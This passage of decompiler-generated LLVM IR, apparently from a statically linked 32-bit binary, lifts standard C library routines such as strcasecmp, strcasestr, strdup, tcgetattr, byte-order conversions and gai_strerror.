  %tmp44 = inttoptr i32 %v1_805c8bf to i16*
  %v6_805c8ca = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_806cc6a.744 to i32), i32 14)
  %v0_805c8e1.pre = load i32, i32* @edi, align 4
  %v0_805c8e3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c8d2

dec_label_pc_805c8d2:                             ; preds = %dec_label_pc_805c89c.dec_label_pc_805c8d2_crit_edge, %dec_label_pc_805c8a3
  %v0_805c8e3 = phi i32 [ %v0_805c89e, %dec_label_pc_805c89c.dec_label_pc_805c8d2_crit_edge ], [ %v0_805c8e3.pre, %dec_label_pc_805c8a3 ]
  %v0_805c8e1 = phi i32 [ %arg3, %dec_label_pc_805c89c.dec_label_pc_805c8d2_crit_edge ], [ %v0_805c8e1.pre, %dec_label_pc_805c8a3 ]
  %v4_805c8d4 = icmp eq i32 %arg2, 0
  %v1_805c8d9 = icmp eq i1 %v4_805c8d4, false
  %v2_805c8e1 = select i1 %v1_805c8d9, i32 %v0_805c8e1, i32 0
  store i32 %v2_805c8e1, i32* @edi, align 4
  %v5_805c8e3 = inttoptr i32 %v0_805c8e3 to i8*
  store i8* %v5_805c8e3, i8** %stack_var_-108, align 4
  %v3_805c8e4 = call i32 @strlen(i8* %v5_805c8e3)
  %v1_805c8ec = add i32 %v3_805c8e4, 1
  store i32 %v1_805c8ec, i32* %ebx.global-to-local, align 4
  %v1_805c8ef = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v1_805c8ec, %v1_805c8ef
  br i1 %tmp, label %dec_label_pc_805c8f3, label %dec_label_pc_805c8fa

dec_label_pc_805c8f3:                             ; preds = %dec_label_pc_805c8d2
  store i32 %v1_805c8ef, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_805c8fa

dec_label_pc_805c8fa:                             ; preds = %dec_label_pc_805c8d2, %dec_label_pc_805c8f3
  %v0_805c8ff = phi i32 [ %v1_805c8ec, %dec_label_pc_805c8d2 ], [ %v1_805c8ef, %dec_label_pc_805c8f3 ]
  %v1_805c8fa = icmp eq i32 %v0_805c8ff, 0
  br i1 %v1_805c8fa, label %dec_label_pc_805c916, label %dec_label_pc_805c8fe

dec_label_pc_805c8fe:                             ; preds = %dec_label_pc_805c8fa
  %v0_805c900 = load i32, i32* @esi, align 4
  %v8_805c901 = inttoptr i32 %arg2 to i8*
  store i8* %v8_805c901, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_805c905 = call i32 @memcpy(i16* %tmp45, i32 %v0_805c900, i32 %v0_805c8ff)
  %v1_805c911 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c911 = add i32 %arg2, -1
  %v3_805c911 = add i32 %v2_805c911, %v1_805c911
  %v4_805c911 = inttoptr i32 %v3_805c911 to i8*
  store i8 0, i8* %v4_805c911, align 1
  br label %dec_label_pc_805c916

dec_label_pc_805c916:                             ; preds = %dec_label_pc_805c8fa, %dec_label_pc_805c8fe
  %v0_805c916 = load i32, i32* @ebp, align 4
  %v1_805c916 = icmp eq i32 %v0_805c916, 0
  br i1 %v1_805c916, label %dec_label_pc_805c921, label %dec_label_pc_805c91a

dec_label_pc_805c91a:                             ; preds = %dec_label_pc_805c916
  %v0_805c91a = load i8*, i8** %stack_var_-108, align 4
  %v1_805c91a = ptrtoint i8* %v0_805c91a to i32
  %v2_805c91a = call i32 @__errno_location(i32 %v1_805c91a)
  %v0_805c91f = load i32, i32* @ebp, align 4
  %v2_805c91f = inttoptr i32 %v2_805c91a to i32*
  store i32 %v0_805c91f, i32* %v2_805c91f, align 4
  %v0_805c924.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805c921

dec_label_pc_805c921:                             ; preds = %dec_label_pc_805c916, %dec_label_pc_805c91a
  %v0_805c924 = phi i32 [ 0, %dec_label_pc_805c916 ], [ %v0_805c924.pre, %dec_label_pc_805c91a ]
  store i32 %v0_805c876, i32* @esi, align 4
  store i32 %v0_805c875, i32* @edi, align 4
  store i32 %v0_805c874, i32* @ebp, align 4
  ret i32 %v0_805c924

; uselistorder directives
  uselistorder i32 %v1_805c8ef, { 1, 2, 0 }
  uselistorder i32 %v1_805c8ec, { 1, 0, 2 }
  uselistorder i32 %v1_805c8bf, { 1, 0, 2 }
  uselistorder i32 %v1_805c897, { 0, 2, 1 }
  uselistorder i32 %v3_805c894, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_806cc80.743 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_805c921, { 1, 0 }
  uselistorder label %dec_label_pc_805c916, { 1, 0 }
  uselistorder label %dec_label_pc_805c8fa, { 1, 0 }
  uselistorder label %dec_label_pc_805c8d2, { 1, 0 }
  uselistorder label %dec_label_pc_805c891, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805c93c = inttoptr i32 %arg2 to i8*
  %v3_805c93c = call i32 @memmove(i8* %v2_805c93c, i32 %arg1)
  ret i32 %v3_805c93c
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805c946 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c946, i32* @ecx, align 4
  %v0_805c950 = load i32, i32* bitcast (i32** @global_var_8073fd4.745 to i32*), align 4
  br label %dec_label_pc_805c956

dec_label_pc_805c956:                             ; preds = %dec_label_pc_805c973, %entry
  %v0_805c9796 = phi i32 [ %v0_805c9797, %dec_label_pc_805c973 ], [ 0, %entry ]
  %v0_805c973 = phi i32 [ %v1_805c973, %dec_label_pc_805c973 ], [ %arg2, %entry ]
  %v0_805c974 = phi i32 [ %v1_805c974, %dec_label_pc_805c973 ], [ %v4_805c946, %entry ]
  %v12_805c956 = icmp eq i32 %v0_805c974, %v0_805c973
  %.pre = inttoptr i32 %v0_805c974 to i8*
  br i1 %v12_805c956, label %dec_label_pc_805c96e, label %dec_label_pc_805c95a

dec_label_pc_805c95a:                             ; preds = %dec_label_pc_805c956
  %v2_805c95a = load i8, i8* %.pre, align 1
  %v3_805c95a = zext i8 %v2_805c95a to i32
  %v2_805c95d = mul nuw nsw i32 %v3_805c95a, 2
  %v3_805c95d = add i32 %v2_805c95d, %v0_805c950
  %v4_805c95d = inttoptr i32 %v3_805c95d to i16*
  %v5_805c95d = load i16, i16* %v4_805c95d, align 2
  %v6_805c95d = sext i16 %v5_805c95d to i32
  %v1_805c961 = inttoptr i32 %v0_805c973 to i8*
  %v2_805c961 = load i8, i8* %v1_805c961, align 1
  %v3_805c961 = zext i8 %v2_805c961 to i32
  %v2_805c964 = mul nuw nsw i32 %v3_805c961, 2
  %v3_805c964 = add i32 %v2_805c964, %v0_805c950
  %v4_805c964 = inttoptr i32 %v3_805c964 to i16*
  %v5_805c964 = load i16, i16* %v4_805c964, align 2
  %v6_805c964 = sext i16 %v5_805c964 to i32
  %v2_805c968 = sub nsw i32 %v6_805c95d, %v6_805c964
  %v12_805c968 = icmp eq i32 %v2_805c968, 0
  store i32 %v2_805c968, i32* @edx, align 4
  %v1_805c96c = icmp eq i1 %v12_805c968, false
  br i1 %v1_805c96c, label %dec_label_pc_805c977, label %dec_label_pc_805c96e

dec_label_pc_805c96e:                             ; preds = %dec_label_pc_805c956, %dec_label_pc_805c95a
  %v0_805c9797 = phi i32 [ %v2_805c968, %dec_label_pc_805c95a ], [ %v0_805c9796, %dec_label_pc_805c956 ]
  %v2_805c96e = load i8, i8* %.pre, align 1
  %v3_805c96e = icmp eq i8 %v2_805c96e, 0
  br i1 %v3_805c96e, label %dec_label_pc_805c977, label %dec_label_pc_805c973

dec_label_pc_805c973:                             ; preds = %dec_label_pc_805c96e
  %v1_805c973 = add i32 %v0_805c973, 1
  %v1_805c974 = add i32 %v0_805c974, 1
  store i32 %v1_805c974, i32* @ecx, align 4
  br label %dec_label_pc_805c956

dec_label_pc_805c977:                             ; preds = %dec_label_pc_805c96e, %dec_label_pc_805c95a
  %v0_805c979 = phi i32 [ %v0_805c9797, %dec_label_pc_805c96e ], [ %v2_805c968, %dec_label_pc_805c95a ]
  ret i32 %v0_805c979

; uselistorder directives
  uselistorder i32 %v1_805c974, { 1, 0 }
  uselistorder i32 %v0_805c9797, { 1, 0 }
  uselistorder i32 %v2_805c968, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805c974, { 2, 1, 0 }
  uselistorder i32 %v0_805c973, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805c96e, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805c97f = load i32, i32* @ebx, align 4
  %v4_805c983 = ptrtoint i8* %arg1 to i32
  %v1_805c98f18 = inttoptr i32 %arg2 to i8*
  %v2_805c98f1931 = load i8, i8* %v1_805c98f18, align 1
  %v4_805c9912335 = icmp eq i8 %v2_805c98f1931, 0
  %v1_805c9932436 = icmp eq i1 %v4_805c9912335, false
  br i1 %v1_805c9932436, label %dec_label_pc_805c999.lr.ph.lr.ph, label %dec_label_pc_805c9c9

dec_label_pc_805c999.lr.ph.lr.ph:                 ; preds = %entry
  %v3_805c98f2032 = zext i8 %v2_805c98f1931 to i32
  %v4_805c98f.pre.pre = load i32, i32* @eax, align 4
  %v5_805c98f2133 = and i32 %v4_805c98f.pre.pre, -256
  %v6_805c98f2234 = or i32 %v3_805c98f2032, %v5_805c98f2133
  %v4_805c999.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805c999.lr.ph

dec_label_pc_805c999.lr.ph:                       ; preds = %dec_label_pc_805c999.lr.ph.lr.ph, %dec_label_pc_805c9c4
  %v4_805c999.pre = phi i32 [ %v4_805c999.pre.pre, %dec_label_pc_805c999.lr.ph.lr.ph ], [ %v0_805c9a6, %dec_label_pc_805c9c4 ]
  %v6_805c98f2239 = phi i32 [ %v6_805c98f2234, %dec_label_pc_805c999.lr.ph.lr.ph ], [ %v6_805c98f22, %dec_label_pc_805c9c4 ]
  %v2_805c98f1938 = phi i8 [ %v2_805c98f1931, %dec_label_pc_805c999.lr.ph.lr.ph ], [ %v2_805c98f19, %dec_label_pc_805c9c4 ]
  %v0_805c9c437 = phi i32 [ %v4_805c983, %dec_label_pc_805c999.lr.ph.lr.ph ], [ %v1_805c9c4, %dec_label_pc_805c9c4 ]
  br label %dec_label_pc_805c999

dec_label_pc_805c999:                             ; preds = %dec_label_pc_805c999.lr.ph, %dec_label_pc_805c9b9
  %v4_805c999 = phi i32 [ %v4_805c999.pre, %dec_label_pc_805c999.lr.ph ], [ %v4_805c99944, %dec_label_pc_805c9b9 ]
  %v6_805c98f29 = phi i32 [ %v6_805c98f2239, %dec_label_pc_805c999.lr.ph ], [ %v6_805c98f, %dec_label_pc_805c9b9 ]
  %v2_805c98f28 = phi i8 [ %v2_805c98f1938, %dec_label_pc_805c999.lr.ph ], [ %v2_805c98f, %dec_label_pc_805c9b9 ]
  %v1_805c98f27 = phi i8* [ %v1_805c98f18, %dec_label_pc_805c999.lr.ph ], [ %v1_805c98f, %dec_label_pc_805c9b9 ]
  %v0_805c9b926 = phi i32 [ %arg2, %dec_label_pc_805c999.lr.ph ], [ %v1_805c9b9, %dec_label_pc_805c9b9 ]
  %v0_805c9ba25 = phi i32 [ %v0_805c9c437, %dec_label_pc_805c999.lr.ph ], [ %v1_805c9ba, %dec_label_pc_805c9b9 ]
  %v1_805c999 = inttoptr i32 %v0_805c9ba25 to i8*
  %v2_805c999 = load i8, i8* %v1_805c999, align 1
  %v3_805c999 = zext i8 %v2_805c999 to i32
  %v5_805c999 = and i32 %v4_805c999, -256
  %v6_805c999 = or i32 %v5_805c999, %v3_805c999
  %v15_805c99f = icmp eq i8 %v2_805c98f28, %v2_805c999
  br i1 %v15_805c99f, label %dec_label_pc_805c9b9, label %dec_label_pc_805c9a3

dec_label_pc_805c9a3:                             ; preds = %dec_label_pc_805c999
  %v2_805c9a3 = load i8, i8* %v1_805c999, align 1
  %v3_805c9a3 = zext i8 %v2_805c9a3 to i32
  %v0_805c9a6 = load i32, i32* bitcast (i32** @global_var_8073fd4.745 to i32*), align 4
  %v2_805c9ac = load i8, i8* %v1_805c98f27, align 1
  %v3_805c9ac = zext i8 %v2_805c9ac to i32
  %v2_805c9af = mul nuw nsw i32 %v3_805c9a3, 2
  %v3_805c9af = add i32 %v2_805c9af, %v0_805c9a6
  %v4_805c9af = inttoptr i32 %v3_805c9af to i16*
  %v5_805c9af = load i16, i16* %v4_805c9af, align 2
  %v6_805c9af = zext i16 %v5_805c9af to i32
  %v4_805c9b3 = mul nuw nsw i32 %v3_805c9ac, 2
  %v5_805c9b3 = add i32 %v4_805c9b3, %v0_805c9a6
  %v6_805c9b3 = inttoptr i32 %v5_805c9b3 to i16*
  %v7_805c9b3 = load i16, i16* %v6_805c9b3, align 2
  %v18_805c9b3 = icmp eq i16 %v5_805c9af, %v7_805c9b3
  %v1_805c9b7 = icmp eq i1 %v18_805c9b3, false
  br i1 %v1_805c9b7, label %dec_label_pc_805c9bd, label %dec_label_pc_805c9b9

dec_label_pc_805c9b9:                             ; preds = %dec_label_pc_805c9a3, %dec_label_pc_805c999
  %v4_805c99944 = phi i32 [ %v0_805c9a6, %dec_label_pc_805c9a3 ], [ %v6_805c999, %dec_label_pc_805c999 ]
  %v4_805c98f6 = phi i32 [ %v6_805c9af, %dec_label_pc_805c9a3 ], [ %v6_805c98f29, %dec_label_pc_805c999 ]
  %v1_805c9b9 = add i32 %v0_805c9b926, 1
  %v1_805c9ba = add i32 %v0_805c9ba25, 1
  %v1_805c98f = inttoptr i32 %v1_805c9b9 to i8*
  %v2_805c98f = load i8, i8* %v1_805c98f, align 1
  %v3_805c98f = zext i8 %v2_805c98f to i32
  %v5_805c98f = and i32 %v4_805c98f6, -256
  %v6_805c98f = or i32 %v3_805c98f, %v5_805c98f
  %v4_805c991 = icmp eq i8 %v2_805c98f, 0
  %v1_805c993 = icmp eq i1 %v4_805c991, false
  br i1 %v1_805c993, label %dec_label_pc_805c999, label %dec_label_pc_805c9c9

dec_label_pc_805c9bd:                             ; preds = %dec_label_pc_805c9a3
  %v4_805c9bd = icmp eq i8 %v2_805c999, 0
  br i1 %v4_805c9bd, label %dec_label_pc_805c9c7, label %dec_label_pc_805c9c4

dec_label_pc_805c9c4:                             ; preds = %dec_label_pc_805c9bd
  %v1_805c9c4 = add i32 %v0_805c9c437, 1
  %v2_805c98f19 = load i8, i8* %v1_805c98f18, align 1
  %v3_805c98f20 = zext i8 %v2_805c98f19 to i32
  %v5_805c98f21 = and i32 %v6_805c9af, 65280
  %v6_805c98f22 = or i32 %v3_805c98f20, %v5_805c98f21
  %v4_805c99123 = icmp eq i8 %v2_805c98f19, 0
  %v1_805c99324 = icmp eq i1 %v4_805c99123, false
  br i1 %v1_805c99324, label %dec_label_pc_805c999.lr.ph, label %dec_label_pc_805c9c9

dec_label_pc_805c9c7:                             ; preds = %dec_label_pc_805c9bd
  br label %dec_label_pc_805c9c9

dec_label_pc_805c9c9:                             ; preds = %dec_label_pc_805c9c4, %entry, %dec_label_pc_805c9b9, %dec_label_pc_805c9c7
  %storemerge = phi i32 [ 0, %dec_label_pc_805c9c7 ], [ %v4_805c983, %entry ], [ %v1_805c9c4, %dec_label_pc_805c9c4 ], [ %v0_805c9c437, %dec_label_pc_805c9b9 ]
  store i32 %v0_805c97f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805c98f19, { 1, 2, 0 }
  uselistorder i8 %v2_805c98f, { 1, 2, 0 }
  uselistorder i8* %v1_805c98f, { 1, 0 }
  uselistorder i32 %v0_805c9a6, { 1, 2, 3, 0 }
  uselistorder i8 %v2_805c999, { 1, 0, 2 }
  uselistorder i32 %v0_805c9ba25, { 1, 0 }
  uselistorder i8 %v2_805c98f1931, { 0, 2, 1 }
  uselistorder i8* %v1_805c98f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805c9c9, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805c999, { 1, 0 }
  uselistorder label %dec_label_pc_805c999.lr.ph, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805c9d0 = load i32, i32* @edi, align 4
  %v0_805c9d1 = load i32, i32* @esi, align 4
  %v0_805c9d2 = load i32, i32* @ebx, align 4
  store i32 %v0_805c9d2, i32* %stack_var_-12, align 4
  %v4_805c9d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c9d3, i32* @edi, align 4
  %v3_805c9db = call i32 @strlen(i8* %arg1)
  %v1_805c9e0 = add i32 %v3_805c9db, 1
  store i32 %v1_805c9e0, i32* @esi, align 4
  %v2_805c9e6 = call i32 @malloc(i32 %v1_805c9e0)
  store i32 %v2_805c9e6, i32* %ebx.global-to-local, align 4
  %v1_805c9f0 = icmp eq i32 %v2_805c9e6, 0
  br i1 %v1_805c9f0, label %dec_label_pc_805ca00, label %dec_label_pc_805c9f4

dec_label_pc_805c9f4:                             ; preds = %entry
  %v0_805c9f5 = load i32, i32* @esi, align 4
  %v0_805c9f6 = load i32, i32* @edi, align 4
  %tmp12 = inttoptr i32 %v2_805c9e6 to i16*
  %v6_805c9f8 = call i32 @memcpy(i16* %tmp12, i32 %v0_805c9f6, i32 %v0_805c9f5)
  %v0_805ca00.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ca00

dec_label_pc_805ca00:                             ; preds = %entry, %dec_label_pc_805c9f4
  %v0_805ca00 = phi i32 [ 0, %entry ], [ %v0_805ca00.pre, %dec_label_pc_805c9f4 ]
  %v2_805ca02 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ca02, i32* @ebx, align 4
  store i32 %v0_805c9d1, i32* @esi, align 4
  store i32 %v0_805c9d0, i32* @edi, align 4
  ret i32 %v0_805ca00

; uselistorder directives
  uselistorder i32 %v2_805c9e6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ca00, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805ca18 = inttoptr i32 %arg1 to i8*
  %v4_805ca18 = call i32 @strtok_r(i8* %v3_805ca18, i32 %arg2, i32 ptrtoint (i32* @global_var_807c6a0.746 to i32))
  ret i32 %v4_805ca18
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_805ca30 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_805ca35 = icmp eq i32 %v3_805ca30, 0
  %v1_805ca37 = zext i1 %v1_805ca35 to i32
  ret i32 %v1_805ca37
}

define i32 @__libc_tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805ca52 = call i32 @ioctl(i32 %arg1, i32 21513, i32 1)
  ret i32 %v3_805ca52
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_5()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805ca5c = load i32, i32* @esi, align 4
  %v0_805ca5d = load i32, i32* @ebx, align 4
  store i32 %v0_805ca5d, i32* %stack_var_-8, align 4
  %v2_805ca61 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805ca61, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_805ca73 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_805ca61)
  store i32 %v3_805ca73, i32* %eax.global-to-local, align 4
  store i32 %v3_805ca73, i32* @esi, align 4
  %v1_805ca7d = icmp eq i32 %v3_805ca73, 0
  %v1_805ca7f = icmp eq i1 %v1_805ca7d, false
  br i1 %v1_805ca7f, label %dec_label_pc_805cac4, label %dec_label_pc_805ca81

dec_label_pc_805ca81:                             ; preds = %entry
  %v3_805ca81 = load i32, i32* %stack_var_-44, align 4
  %v1_805ca85 = load i32, i32* @ebx, align 4
  %v2_805ca85 = inttoptr i32 %v1_805ca85 to i32*
  store i32 %v3_805ca81, i32* %v2_805ca85, align 4
  %v1_805ca8b = load i32, i32* @ebx, align 4
  %v2_805ca8b = add i32 %v1_805ca8b, 4
  %v3_805ca8b = inttoptr i32 %v2_805ca8b to i32*
  %v1_805ca92 = load i32, i32* @ebx, align 4
  %v2_805ca92 = add i32 %v1_805ca92, 8
  %v3_805ca92 = inttoptr i32 %v2_805ca92 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_805ca99 = load i32, i32* @ebx, align 4
  %v2_805ca99 = add i32 %v1_805ca99, 12
  %v3_805ca99 = inttoptr i32 %v2_805ca99 to i32*
  store i32 %tmp3, i32* %v3_805ca99, align 4
  %v4_805ca9c = zext i8 %tmp to i32
  %v5_805ca9c = load i32, i32* %eax.global-to-local, align 4
  %v6_805ca9c = and i32 %v5_805ca9c, -256
  %v7_805ca9c = or i32 %v6_805ca9c, %v4_805ca9c
  store i32 %v7_805ca9c, i32* %eax.global-to-local, align 4
  %v2_805caa0 = load i32, i32* @ebx, align 4
  %v3_805caa0 = add i32 %v2_805caa0, 16
  %v4_805caa0 = inttoptr i32 %v3_805caa0 to i8*
  store i8 %tmp, i8* %v4_805caa0, align 1
  %v0_805caa3 = load i32, i32* %eax.global-to-local, align 4
  %v2_805caa6 = ptrtoint i32* %stack_var_-27 to i32
  %v0_805caab = load i32, i32* @ebx, align 4
  %v1_805caab = add i32 %v0_805caab, 17
  store i32 %v1_805caab, i32* %eax.global-to-local, align 4
  %v4_805caaf = call i32 @__GI_mempcpy(i32 %v1_805caab, i32 %v2_805caa6, i32 19, i32 %v0_805caa3)
  store i32 %v4_805caaf, i32* %eax.global-to-local, align 4
  %v3_805cabc = inttoptr i32 %v4_805caaf to i8*
  %v4_805cabc = call i32 @__GI_memset(i8* %v3_805cabc, i32 0, i32 13)
  store i32 %v4_805cabc, i32* %eax.global-to-local, align 4
  %v0_805cac4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805cac4

dec_label_pc_805cac4:                             ; preds = %entry, %dec_label_pc_805ca81
  %v0_805cac4 = phi i32 [ %v3_805ca73, %entry ], [ %v0_805cac4.pre, %dec_label_pc_805ca81 ]
  store i32 %v0_805cac4, i32* %eax.global-to-local, align 4
  %v2_805cac9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805cac9, i32* @ebx, align 4
  store i32 %v0_805ca5c, i32* @esi, align 4
  ret i32 %v0_805cac4

; uselistorder directives
  uselistorder i32 %v0_805cac4, { 1, 0 }
  uselistorder i32 %v3_805ca73, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_805cac4, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805cad0 = trunc i32 %arg1 to i16
  %v2_805cad0 = call i16 @llvm.bswap.i16(i16 %v1_805cad0)
  %v3_805cad0 = zext i16 %v2_805cad0 to i32
  ret i32 %v3_805cad0
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805cadc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805cadc
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805cae3 = trunc i32 %arg1 to i16
  %v2_805cae3 = call i16 @llvm.bswap.i16(i16 %v1_805cae3)
  %v3_805cae3 = zext i16 %v2_805cae3 to i32
  ret i32 %v3_805cae3
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805caef = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_805caef
}

define i32 @gai_strerror(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_805cafc

dec_label_pc_805cafc:                             ; preds = %entry, %dec_label_pc_805cb0d
  %v0_805cb0d8 = phi i32 [ 0, %entry ], [ %v1_805cb0d, %dec_label_pc_805cb0d ]
  %v1_805cafc = mul nuw nsw i32 %v0_805cb0d8, 8
  %v2_805cafc = add i32 %v1_805cafc, ptrtoint (i32* @global_var_806d9c0.747 to i32)
  %v3_805cafc = inttoptr i32 %v2_805cafc to i32*
  %v4_805cafc = load i32, i32* %v3_805cafc, align 8
  %v16_805cafc = icmp eq i32 %v4_805cafc, %arg1
  %v1_805cb03 = icmp eq i1 %v16_805cafc, false
  br i1 %v1_805cb03, label %dec_label_pc_805cb0d, label %dec_label_pc_805cb05

dec_label_pc_805cb05:                             ; preds = %dec_label_pc_805cafc
  %v2_805cb05 = add i32 %v1_805cafc, ptrtoint ([42 x i8]** @global_var_806d9c4.749 to i32)
  %v3_805cb05 = inttoptr i32 %v2_805cb05 to i32*
  %v4_805cb05 = load i32, i32* %v3_805cb05, align 4
  ret i32 %v4_805cb05

dec_label_pc_805cb0d:                             ; preds = %dec_label_pc_805cafc
  %v1_805cb0d = add nuw nsw i32 %v0_805cb0d8, 1
  %tmp14 = icmp ult i32 %v1_805cb0d, 16
  br i1 %tmp14, label %dec_label_pc_805cafc, label %dec_label_pc_805cb13

dec_label_pc_805cb13:                             ; preds = %dec_label_pc_805cb0d
  ret i32 ptrtoint ([14 x i8]* @global_var_806d7da.750 to i32)

; uselistorder directives
  uselistorder i32 %v0_805cb0d8, { 1, 0 }
  uselistorder i32 -9, { 3, 4, 5, 1, 6, 0, 7, 8, 9, 2 }
  uselistorder label %dec_label_pc_805cafc, { 1, 0 }
}

define i32 @gaih_inet_serv(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805cb1f = load i32, i32* @edi, align 4
  %v0_805cb20 = load i32, i32* @esi, align 4
  %v0_805cb21 = load i32, i32* @ebx, align 4
  store i32 %v0_805cb21, i32* %stack_var_-16, align 4
  %v15_805cb22 = ptrtoint i32* %stack_var_-60 to i32
  %v0_805cb25 = load i32, i32* @edx, align 4
  store i32 %v0_805cb25, i32* @ebx, align 4
  %v0_805cb27 = load i32, i32* @eax, align 4
  %v0_805cb2a = load i32, i32* @ecx, align 4
  store i32 %tmp4, i32* @edi, align 4
  %v2_805cb43 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805cb4a = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_805cb35

dec_label_pc_805cb35:                             ; preds = %dec_label_pc_805cb70, %entry
  %v0_805cb3b = phi i32 [ %v15_805cb22, %entry ], [ %v1_805cb5c, %dec_label_pc_805cb70 ]
  %storemerge = phi i32 [ 1024, %entry ], [ %v2_805cb70, %dec_label_pc_805cb70 ]
  store i32 %storemerge, i32* @esi, align 4
  %v1_805cb35 = add i32 %storemerge, 30
  %v1_805cb38 = and i32 %v1_805cb35, -16
  store i32 %v1_805cb38, i32* %eax.global-to-local, align 4
  %v2_805cb3b = sub i32 %v0_805cb3b, %v1_805cb38
  %v1_805cb3d = add i32 %v2_805cb3b, 15
  store i32 %v1_805cb3d, i32* %edx.global-to-local, align 4
  %v2_805cb41 = add i32 %v2_805cb3b, -4
  %v3_805cb41 = inttoptr i32 %v2_805cb41 to i32*
  store i32 %v1_805cb38, i32* %v3_805cb41, align 4
  %v0_805cb42 = load i32, i32* %eax.global-to-local, align 4
  %v2_805cb42 = add i32 %v2_805cb3b, -8
  %v3_805cb42 = inttoptr i32 %v2_805cb42 to i32*
  store i32 %v0_805cb42, i32* %v3_805cb42, align 4
  %v2_805cb46 = add i32 %v2_805cb3b, -12
  %v3_805cb46 = inttoptr i32 %v2_805cb46 to i32*
  store i32 %v2_805cb43, i32* %v3_805cb46, align 4
  %v0_805cb47 = load i32, i32* %edx.global-to-local, align 4
  %v1_805cb47 = and i32 %v0_805cb47, -16
  store i32 %v1_805cb47, i32* %edx.global-to-local, align 4
  %v0_805cb4d = load i32, i32* @esi, align 4
  %v2_805cb4d = add i32 %v2_805cb3b, -16
  %v3_805cb4d = inttoptr i32 %v2_805cb4d to i32*
  store i32 %v0_805cb4d, i32* %v3_805cb4d, align 4
  %v0_805cb4e = load i32, i32* %edx.global-to-local, align 4
  %v2_805cb4e = add i32 %v2_805cb3b, -20
  %v3_805cb4e = inttoptr i32 %v2_805cb4e to i32*
  store i32 %v0_805cb4e, i32* %v3_805cb4e, align 4
  %v2_805cb4f = add i32 %v2_805cb3b, -24
  %v3_805cb4f = inttoptr i32 %v2_805cb4f to i32*
  store i32 %v2_805cb4a, i32* %v3_805cb4f, align 4
  %v0_805cb50 = load i32, i32* @ebx, align 4
  %v1_805cb50 = add i32 %v0_805cb50, 3
  store i32 %v1_805cb50, i32* %eax.global-to-local, align 4
  %v2_805cb53 = add i32 %v2_805cb3b, -28
